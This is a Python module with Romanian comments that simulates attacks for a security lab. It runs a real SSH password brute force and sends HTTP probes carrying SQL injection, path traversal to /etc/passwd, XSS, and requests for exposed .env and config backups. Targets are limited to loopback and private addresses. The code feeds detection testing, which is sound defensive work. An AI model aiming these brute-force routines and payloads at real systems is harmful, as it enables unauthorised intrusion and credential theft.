"""Simulator Red Team pentru laborator: trafic REAL catre tinte locale/private (SSH + HTTP).

Se ataca exclusiv adrese de laborator (loopback / RFC 1918). Tinte publice sunt refuzate.
"""

from __future__ import annotations

import ipaddress
import logging
import socket
import time
from dataclasses import dataclass
from typing import Callable, List, Optional, Sequence, Tuple

import requests

try:  # paramiko e necesar doar pentru simularea SSH
    import paramiko
except ImportError:  # pragma: no cover - mesaj clar la rulare
    paramiko = None  # type: ignore[assignment]

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

ProgressFn = Callable[[str], None]

DEFAULT_USERS: Sequence[str] = ("admin", "root", "test", "guest", "ubuntu", "oracle", "postgres", "victim")
DEFAULT_PASSWORDS: Sequence[str] = ("123456", "password", "admin", "letmein", "qwerty")

WEB_PROBES: Sequence[Tuple[str, str]] = (
    ("/", "Mozilla/5.0 (X11; Linux x86_64)"),
    ("/products.php?id=1%20OR%201=1", "sqlmap/1.6#stable"),
    ("/products.php?id=-1%20UNION%20SELECT%201,username,password%20FROM%20users--", "sqlmap/1.6#stable"),
    ("/download.php?file=../../../../etc/passwd", "Mozilla/5.0"),
    ("/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "Mozilla/5.0"),
    ("/.env", "Nikto/2.1.6"),
    ("/wp-config.php.bak", "Nikto/2.1.6"),
    ("/phpmyadmin/", "Mozilla/5.0"),
)


class SimulationError(RuntimeError):
    """Eroare la rularea simularii (tinta indisponibila, dependenta lipsa, tinta nepermisa)."""


@dataclass
class SimulationResult:
    """Sumarul unei simulari."""

    service: str
    target: str
    attempts: int
    successes: int = 0


_LAB_NETWORKS = [
    ipaddress.ip_network(n)
    for n in ("127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "::1/128")
]


def is_safe_target(host: str) -> bool:
    """True doar daca `host` rezolva la o adresa loopback sau privata (RFC 1918)."""
    try:
        infos = socket.getaddrinfo(host, None)
    except (socket.gaierror, UnicodeError):
        return False
    addresses = {info[4][0] for info in infos}
    if not addresses:
        return False
    return all(any(ipaddress.ip_address(a) in net for net in _LAB_NETWORKS) for a in addresses)


def _require_safe(host: str) -> None:
    if not is_safe_target(host):
        raise SimulationError(
            f"Tinta '{host}' nu este o adresa locala/privata. Din motive de siguranta, "
            "simulatorul ataca doar loopback si retele private (127.0.0.0/8, 10/8, 172.16/12, 192.168/16)."
        )


def simulate_ssh_bruteforce(
    target_host: str = "127.0.0.1",
    target_port: int = 22,
    users: Optional[Sequence[str]] = None,
    passwords: Optional[Sequence[str]] = None,
    valid_credentials: Optional[Tuple[str, str]] = None,
    delay: float = 0.2,
    progress: Optional[ProgressFn] = None,
) -> SimulationResult:
    """Incercari REALE de autentificare SSH cu parole (paramiko) pentru a popula auth.log.

    Args:
        valid_credentials: daca e dat, ultima incercare foloseste aceste credentiale valide
            (demonstreaza detectia 'login reusit dupa brute force').

    Raises:
        SimulationError: tinta nepermisa, dependenta lipsa sau serviciul SSH indisponibil.
    """
    _require_safe(target_host)
    if paramiko is None:
        raise SimulationError("Lipseste 'paramiko'. Instaleaza dependentele: pip install -r requirements.txt")

    say = progress or (lambda _msg: None)
    pairs = [(u, p) for u in (users or DEFAULT_USERS) for p in (passwords or DEFAULT_PASSWORDS[:2])]
    if valid_credentials:
        pairs.append(valid_credentials)

    attempts = successes = 0
    for username, password in pairs:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                target_host,
                port=target_port,
                username=username,
                password=password,
                allow_agent=False,
                look_for_keys=False,
                timeout=5,
                banner_timeout=10,
                auth_timeout=10,
            )
            successes += 1
            say(f"  [+] {username}:{password} -> AUTENTIFICARE REUSITA")
        except paramiko.AuthenticationException:
            say(f"  [-] {username}:{password} -> respins")
        except (paramiko.SSHException, OSError) as exc:
            if attempts == 0:
                raise SimulationError(
                    f"Nu ma pot conecta la SSH pe {target_host}:{target_port} ({exc}). "
                    "Porneste laboratorul: ./lab_setup/setup_lab.sh start"
                ) from exc
            say(f"  [!] {username}:{password} -> eroare conexiune ({exc})")
        finally:
            client.close()
        attempts += 1
        time.sleep(delay)

    return SimulationResult("ssh", f"{target_host}:{target_port}", attempts, successes)


def simulate_web_attacks(
    target_host: str = "127.0.0.1",
    target_port: int = 80,
    delay: float = 0.1,
    progress: Optional[ProgressFn] = None,
) -> SimulationResult:
    """Trimite cereri HTTP cu payload-uri de atac (inofensive) pentru a popula access.log.

    Raises:
        SimulationError: tinta nepermisa sau serverul web indisponibil.
    """
    _require_safe(target_host)
    say = progress or (lambda _msg: None)
    sent = 0

    for path, user_agent in WEB_PROBES:
        url = f"http://{target_host}:{target_port}{path}"
        try:
            response = requests.get(url, headers={"User-Agent": user_agent}, timeout=5, allow_redirects=False)
        except requests.exceptions.RequestException as exc:
            if sent == 0:
                raise SimulationError(
                    f"Serverul web de pe {target_host}:{target_port} nu raspunde ({exc}). "
                    "Porneste laboratorul: ./lab_setup/setup_lab.sh start"
                ) from exc
            say(f"  [!] {path[:50]} -> eroare ({exc})")
            continue
        say(f"  [-] {path[:60]} -> HTTP {response.status_code}")
        sent += 1
        time.sleep(delay)

    return SimulationResult("web", f"{target_host}:{target_port}", sent)
